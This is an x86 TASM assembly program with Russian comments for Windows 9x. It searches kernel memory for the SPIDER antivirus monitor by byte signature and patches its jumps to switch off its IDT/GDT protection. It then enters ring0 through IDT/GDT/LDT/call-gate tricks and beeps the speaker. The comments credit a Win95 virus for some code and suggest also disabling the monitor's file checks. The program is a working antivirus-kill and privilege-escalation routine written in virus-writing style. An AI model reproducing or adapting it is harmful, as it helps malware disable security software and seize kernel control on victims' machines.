;-----------------------------------------------------------------------------
; Прога пытается найти в памяти SPIDER'а и убить его, точнее его часть,
; отвечающую за защиту IDT/GDT.
; Перейдя в ring0, пищит динамиком через порты.
;
; Когда мы ищем SPIDER'а в пространстве C0000000h - C4000000h, мы предполагаем,
; что он был загружен вместе с виндой. Если нет - он может быть и на C7 и
; на CA и еще черте где.
;
; Компилируется TASM'ом.
;-----------------------------------------------------------------------------

;DEBUG = 1                               ;Для зачистки багов.
                                        ;
DEBUG_BREAKPOINT macro                  ;
IFDEF  DEBUG                            ;
       int  3                           ;
ENDIF                                   ;
endm                                    ;
                                        ;
extrn  ExitProcess:near                 ;
extrn  MessageBoxA:near                 ;
                                        ;
.386p                                   ;
.model flat                             ;
.data                                   ;
db 0                                    ;
.code                                   ;
                                        ;
_Start:                                 ;
        call    get_delta               ;
   get_delta:                           ;
        pop     ebp                     ;
        sub     ebp, offset get_delta   ;EBP = дельта
                                        ;
        DEBUG_BREAKPOINT                ;
        lea     ebx, Spid_sign          ;Ищем СПИДЕРа
        mov     esi, 0C0000000h         ;Сканируем 64Мб, начиная с C0000000h
        mov     edi, 0C4000000h         ;
        call    AAV_SearchAndPatch      ;
        jc      @@init                  ;
                                        ;Если найден, выводим MessageBox
        push    esi                     ;
        push    offset inis_spid        ;
        push    offset sbuf             ;
        call    sprintf                 ;
        call    mbox                    ;
                                        ;
  @@init:                               ;Дальше все, как в TEST1, кроме
        xor     eax, eax
        call    R0PE_Init               ;самой процедуры R0_Proc.
        jnc     @@inform                ;
                                        ;
        push    40h                     ;
        push    offset stitle           ;
        push    offset errmsg           ;
        push    0                       ;
        call    MessageBoxA             ;
        jmp     exit                    ;
                                        ;
  @@inform:                             ;
        add     eax, offset mtable      ;
        movzx   eax, byte ptr [eax]     ;
        add     eax, offset methods     ;
                                        ;
        push    eax                     ;
        push    offset inis             ;
        push    offset sbuf             ;
        call    sprintf                 ;
                                        ;
        call    mbox                    ;
                                        ;
        cmp     r0pe_method, 0          ;
        jne     @@try_mgdt              ;
                                        ;
        mov     al, r0pe_int            ;
        push    eax                     ;
        push    r0pe_idtbase            ;
        push    offset inis1            ;
        push    offset sbuf             ;
        call    sprintf                 ;
        call    mbox                    ;
        jmp     ok                      ;
                                        ;
  @@try_mgdt:                           ;
        push    r0pe_gdtbase            ;
        push    offset inis2            ;
        push    offset sbuf             ;
        call    sprintf                 ;
        call    mbox                    ;
                                        ;
        cmp     r0pe_method,1           ;
        je      sels                    ;
                                        ;
        push    r0pe_ldtbase            ;
        push    offset inis3            ;
        push    offset sbuf             ;
        call    sprintf                 ;
        call    mbox                    ;
                                        ;
        cmp     r0pe_method,3           ;
        jne     sels                    ;
                                        ;
        movzx   eax, r0pe_ldtalias      ;
        push    eax                     ;
        push    offset inis4            ;
        push    offset sbuf             ;
        call    sprintf                 ;
        call    mbox                    ;
  sels:                                 ;
        movzx   eax, r0pe_cgsel         ;
        push    eax                     ;
        push    r0pe_r0cs               ;
        push    offset inis5            ;
        push    offset sbuf             ;
        call    sprintf                 ;
        call    mbox                    ;
                                        ;
  ok:                                   ;
        lea     ebx, R0_Proc            ;
        call    R0PE_Exec               ;
                                        ;
        call    R0PE_Done               ;
                                        ;
  exit:                                 ;
        push    0                       ;
        call    ExitProcess             ;
                                        ;
;-----------------------------------------------------------------------------
mbox  proc                              ;
        push    40h                     ;
        push    offset stitle           ;
        push    offset sbuf             ;
        push    0                       ;
        call    MessageBoxA             ;
        ret                             ;
mbox  endp                              ;
                                        ;
;-----------------------------------------------------------------------------
R0_Proc:                                ;
        DEBUG_BREAKPOINT                ;
        call    beep                    ;Гудим
        ret                             ;Выходим
                                        ;
;-----------------------------------------------------------------------------
UnProtect_xDT   proc                    ;EBX = xDT.base, ECX = xDT.limit
        inc     ecx                     ;
        add     ecx, 4095               ;
        shr     ecx, 12                 ;
        shr     ebx, 12                 ;
                                        ;
        push    60000h                  ;Доступна для чтения/записи с ring3
        push    0                       ;
        push    ecx                     ;
        push    ebx                     ;
        int     20h                     ;VMM_PageModifyPermissions
        dd      00010133h               ;
        add     esp, 4*4                ;
                                        ;
        ret                             ;
UnProtect_xDT   endp                    ;
                                        ;
;-----------------------------------------------------------------------------
; Гудок портами на динамик.
; Выдернул из win95.julus, т.к. самому писать лениво ;-)
;-----------------------------------------------------------------------------
beep   proc                               ;
       pushad                             ;
       mov ax, 1000                       ;
       mov bx, 200                        ;
       mov cx, ax                         ;
       mov al, 0b6h                       ;
       out 43h, al                        ;
       mov dx, 0012h                      ;
       mov ax, 34dch                      ;
       div cx                             ;
       out 42h, al                        ;
       mov al, ah                         ;
       out 42h, al                        ;
       in al, 61h                         ;
       mov ah, al                         ;
       or al, 03h                         ;
       out 61h, al                        ;
       l1:                                ;
       mov ecx, 4680                      ;
       l2:                                ;
       loop l2                            ;
       dec bx                             ;
       jnz l1                             ;
       mov al, ah                         ;
       out 61h, al                        ;
       popad                              ;
       ret                                ;
beep   endp                               ;
                                          ;
USE_LDTS = 1                              ;
include r0pe.inc                          ;
include sprintf.inc                       ;
include aavs.inc                          ;
                                          ;
inis_spid    db    'Fucken SPIDER was found and patched at address %id08hh', 0
                                          ;
;-----------------------------------------------------------------------------
; Сигнатурки для поиска СПИДЕР'а и патча той его части, которая отвечает
; за защиту IDT/GDT.
; В принципе, если уж мы находим СПИДЕР'а, то пропатчить его можно по
; полной программе (проверку файлов, например), но покамест это не делается...
;-----------------------------------------------------------------------------
;
Spid_sign:                                ;Инфа для поиска:
       db    7               ;№1          ;Длина (у первой д.б. >= 4)
       dd    0                            ;Смещение (у первой игнорируется)
       db    8Bh,07,0C1h,0E8h,0Ch,3Bh,05  ;Сигнатура
       db    1               ;№2          ;Длина
       dd    +11                          ;Смещение от первой
       db    74h                          ;Сигнатура
       db    2               ;№3          ;Длина
       dd    +13                          ;Смещение от первой
       db    3Bh,05                       ;Сигнатура
       db    1               ;№4          ;....
       dd    +19                          ;
       db    75h                          ;
       db    1               ;№5          ;
       dd    +28                          ;
       db    75h                          ;
                                          ;
       db    0                            ;Нулевая длина - конец
                                          ;
       db    1                            ;Забить первый jmp
       dd    +12                          ;
       db    0                            ;
       db    1                            ;Застолбить второй
       dd    +19                          ;
       db    0EBh                         ;
                                          ;
       db    0                            ;Конец
                                          ;
;-----------------------------------------------------------------------------
mtable:                                   ;
       db    (m_IDT-methods)              ;
       db    (m_GDT-methods)              ;
       db    (m_LDT-methods)              ;
       db    (m_LDTA-methods)             ;
       db    (m_LDTS-methods)             ;
       db    (m_PVMM-methods)             ;
                                          ;
methods:                                  ;
m_IDT  db    'IDT',0                      ;
m_GDT  db    'GDT',0                      ;
m_LDT  db    'LDT',0                      ;
m_LDTA db    'LDTA',0                     ;
m_LDTS db    'LDTS',0                     ;
m_PVMM db    'PVMM',0                     ;
                                          ;
stitle  db   'Fuck You',0                 ;
stitle1 db   'More info',0                ;
errmsg  db   'Could not initialize ring0 gate'
        db   0Dh,0Ah, 'Are you under WinNT now???',0
inis   db    'Ring0 gate was initialized with %sz method.',0
inis1  db    'IDT base is %id08hh\nUsing interrupt #%ib02hh.',0
inis2  db    'GDT base is %id08hh\n.',0   ;
inis3  db    'LDT base is %id08hh\n.',0   ;
inis4  db    'LDT alias (selector) is %id08hh\n.',0
inis5  db    'Selectors:\n  %id08h - for code32 segment,\n  %id08h - for CallGate.',0
sbuf   db    100 dup(?)                   ;
                                          ;
end _Start                                ;